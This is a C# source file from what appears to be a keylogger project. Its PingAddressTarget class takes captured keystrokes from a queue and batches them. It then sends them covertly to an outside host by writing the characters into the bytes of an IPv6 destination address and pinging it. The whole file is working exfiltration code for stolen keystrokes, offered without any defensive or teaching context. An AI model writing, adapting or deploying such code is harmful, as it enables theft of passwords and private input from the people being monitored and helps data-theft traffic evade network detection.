using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger {
	class PingAddressTarget : IHandler {
		private IPAddress prefix;
		private int delay_ms = 500;

		public PingAddressTarget(IPAddress prefix) {
			this.prefix = prefix;
		}

		public void handle(BlockingCollection<char> queue) {
			var recv = new List<char>();
			var timer = new Stopwatch();

			for (; ; ) {
				recv.Clear();
				recv.Add(queue.Take());
				timer.Reset();

				for (int i = 0; i < 7; i++) {
					long remaining = delay_ms - timer.ElapsedMilliseconds;

					char item;
					if (!queue.TryTake(out item, (int) remaining)) {
						break;
					}

					recv.Add(item);
				}

				ping(toAddress(recv));
			}
		}

		private IPAddress toAddress(IList<char> keys) {
			Byte[] bytes = prefix.GetAddressBytes();

			for (int i = 0; i < keys.Count; i++) {
				bytes[8 + i] = (byte)keys[i];
			}

			return new IPAddress(bytes);
		}

		private void ping(IPAddress dst) {
			Ping pingSender = new Ping();
			PingOptions options = new PingOptions();

			// Create a buffer of 32 bytes of data to be transmitted.
			string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
			byte[] buffer = Encoding.ASCII.GetBytes(data);
			int timeout = 120;
			PingReply reply = pingSender.Send(dst, timeout, buffer, options);
			if (reply.Status == IPStatus.Success) {
				/*Console.WriteLine("Address: {0}", reply.Address.ToString());
				Console.WriteLine("RoundTrip time: {0}", reply.RoundtripTime);
				Console.WriteLine("Time to live: {0}", reply.Options.Ttl);
				Console.WriteLine("Don't fragment: {0}", reply.Options.DontFragment);
				Console.WriteLine("Buffer size: {0}", reply.Buffer.Length);*/
			}
		}
	}
}
